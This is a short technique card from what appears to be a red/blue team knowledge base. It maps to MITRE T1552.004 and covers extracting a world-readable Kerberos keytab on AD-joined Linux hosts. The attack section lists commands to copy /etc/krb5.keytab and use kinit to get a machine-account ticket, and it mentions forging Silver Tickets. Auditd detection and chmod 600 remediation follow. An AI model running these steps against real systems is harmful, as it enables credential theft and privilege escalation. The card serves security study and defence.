# [CA-UNSC-001]: /etc/krb5.keytab Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-001 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Private Keys (T1552.004)](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux / Unix |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Linux servers joined to AD use `keytab` files to store the machine account's long-term key (password hash). If file permissions are weak (`644` instead of `600`), any local user can read the keytab, extract the machine account's key, and forge Silver Tickets or impersonate the host.
- **Attack Surface:** File permissions on `/etc/krb5.keytab`.
- **Business Impact:** **Host Compromise**. Escalation from low-priv user to Root (via Silver Ticket or machine account abuse).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Read access to keytab.
- **Vulnerable Config:** `chmod 644 /etc/krb5.keytab`.
- **Tools:**
    - [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
    - `kinit`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Permissions**
```bash
ls -l /etc/krb5.keytab
# If world-readable:
cp /etc/krb5.keytab /tmp/
```

**Step 2: Authenticate**
Use the keytab to get a TGT for the host.
```bash
kinit -k -t /tmp/krb5.keytab host/hostname.domain.com
```

**Step 3: Elevate**
Use the machine account TGT to query LDAP or access restricted shares.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Audit
| Source | Event ID | Filter Logic |
|---|---|---|
| **Auditd** | `open` | Unauthorized read of keytab files. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Permissions:** `chmod 600 /etc/krb5.keytab` and `chown root:root`.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-004]
> **Next Logical Step:** [LAT-SMB-001]
